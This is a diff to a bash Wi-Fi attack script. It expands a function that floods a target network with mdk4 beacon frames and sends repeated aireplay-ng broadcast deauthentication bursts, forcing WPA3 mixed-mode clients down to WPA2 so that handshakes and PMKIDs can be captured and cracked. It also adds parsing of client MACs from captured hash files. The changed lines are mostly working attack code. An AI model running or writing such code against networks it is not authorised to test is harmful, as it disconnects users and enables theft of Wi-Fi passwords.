@@ -759,18 +759,56 @@ function devices_scanner() {
 
 
 function mixed_encryption() {
-    echo -e "${BOLD}The Encryption is "$encryption".${RESET} \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\n"
-    #gnome-terminal --geometry=70x3-10000-10000 -- timeout 95s mdk4 $wifi_adapter b -n $bssid_name_original -c $channel -w a
+    # This function is called when a WPA2/WPA3 mixed-mode network is detected.
+    # It attempts to force clients to connect using WPA2 by sending deauthentication frames.
+    # The goal is to capture a WPA2 EAPOL handshake, which is crackable.
+    # Success heavily depends on the Access Point's and client devices' behavior and implementation of mixed mode.
+    # Some clients may resist downgrading to WPA2, or the AP might handle deauths in a way that doesn't lead to a WPA2 handshake.
+    # The function uses two stages: mdk4 for general disruption and aireplay-ng for targeted deauths.
+    echo -e "${BOLD}Encryption is ${encryption}.${RESET} Attempting to force WPA2. This may take a couple of minutes and success depends on client/AP behavior."
+    echo -e "${ORANGE}[INFO]${RESET} Stage 1: Using mdk4 for deauthentication (approximately 60 seconds)."
 
-	(
-	  counter=0
-	  while [ $counter -lt 60 ]; do
-	    mdk4 "$wifi_adapter" b -n "$bssid_name_original" -c "$channel" -w a >/dev/null 2>&1
-	    sleep 5
-	    counter=$((counter + 10))
-	  done
-	) &
-        sleep 2
+    # mdk4 attack - run for approximately 60 seconds
+    # mdk4 'b' mode (Beacon Flood) with '-w a' (WPA TKIP) can sometimes trigger re-associations.
+    # We are trying to disrupt clients enough to make them re-associate using WPA2.
+    mdk4_pid=""
+    (
+      start_time=$(date +%s)
+      while [ $(($(date +%s) - start_time)) -lt 60 ]; do
+        # Run mdk4 for a short burst (e.g., 5 seconds) then check time
+        # mdk4 doesn't have a built-in duration for this specific beacon attack mode, so we manage it externally.
+        timeout 5s mdk4 "${wifi_adapter}" b -n "${bssid_name_original}" -c "${channel}" -w a >/dev/null 2>&1
+        # Brief sleep to prevent tight loop if mdk4 exits immediately or if timeout is very short
+        sleep 1 
+      done
+    ) &
+    mdk4_pid=$!
+    wait "${mdk4_pid}" # Wait for the mdk4 subshell to complete
+    echo -e "${ORANGE}[INFO]${RESET} Stage 1 (mdk4) complete."
+
+    # After mdk4, try aireplay-ng for more direct deauthentication
+    echo -e "${ORANGE}[INFO]${RESET} Stage 2: Using aireplay-ng for deauthentication bursts."
+    
+    total_aireplay_bursts=5    # Number of deauthentication bursts
+    deauth_packets_per_burst=20 # Number of deauth packets to send in each burst (-0 <count>)
+                                # This sends deauths to broadcast MAC (all clients of the AP)
+    sleep_between_bursts=5     # Seconds to wait between bursts
+
+    for burst_count in $(seq 1 ${total_aireplay_bursts}); do
+        echo -e "${ORANGE}[INFO]${RESET} Sending deauth burst ${burst_count}/${total_aireplay_bursts} with aireplay-ng..."
+        # The '-0' option is for deauthentication attack.
+        # '${deauth_packets_per_burst}' is the number of deauths to send.
+        # '-a ${bssid_address}' specifies the BSSID of the target AP.
+        aireplay-ng -0 "${deauth_packets_per_burst}" -a "${bssid_address}" "${wifi_adapter}" >/dev/null 2>&1
+        if [ "${burst_count}" -lt "${total_aireplay_bursts}" ]; then
+            echo -e "${ORANGE}[INFO]${RESET} Sleeping for ${sleep_between_bursts}s before next burst..."
+            sleep "${sleep_between_bursts}"
+        fi
+    done
+    echo -e "${ORANGE}[INFO]${RESET} Stage 2 (aireplay-ng) complete."
+    echo -e "${ORANGE}[INFO]${RESET} Deauthentication attempts finished. Proceeding to EAPOL/PMKID capture phase..."
+    # Original sleep before proceeding to the main attack function that includes hcxdumptool
+    sleep 2 
 }
 
 
@@ -856,8 +894,7 @@ function attacks() {
         hcxpcapngtool -o "$hash_file" "$pcapng_file" &>/dev/null
         deauth_attack
         if [[ -s "$hash_file" ]]; then       
-            sta_mac=$(grep -m1 '^WPA\*0[12]\*' "$hash_file" | cut -d'*' -f5 | sed 's/../&:/g; s/:$//' | tr 'a-f' 'A-F')
-            sleep 5
+            sta_mac=$(grep -m1 '^WPA\*0[12]\*' "$hash_file" | cut -d'*' -f5 | sed 's/../&:/g; s/:$//' | tr 'a-f' 'A-F') # Get STA MAC for info
 
             if grep -q '^WPA\*01\*' "$hash_file"; then
 		echo -e "\n\n${NEON_GREEN}${BOLD}->> Got the PMKID!  ${RESET}(from: $sta_mac)\n"
